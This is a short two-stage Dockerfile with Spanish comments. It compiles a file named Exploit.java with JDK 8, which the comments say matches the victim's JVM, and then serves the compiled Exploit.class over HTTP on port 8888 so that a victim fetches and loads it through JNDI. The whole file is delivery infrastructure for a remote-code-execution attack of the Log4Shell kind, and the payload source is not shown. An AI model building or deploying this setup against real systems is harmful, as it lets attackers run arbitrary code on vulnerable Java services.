# Compila el payload con JDK 8 (bytecode compatible con la JVM victima)
FROM openjdk:8u181-jdk-alpine AS build
WORKDIR /payload
COPY Exploit.java .
RUN javac Exploit.java

# Sirve Exploit.class por HTTP para que la victima lo descargue via JNDI
FROM python:3.12-alpine
WORKDIR /payload
COPY --from=build /payload/Exploit.class /payload/Exploit.class
EXPOSE 8888
CMD ["python3", "-m", "http.server", "8888"]
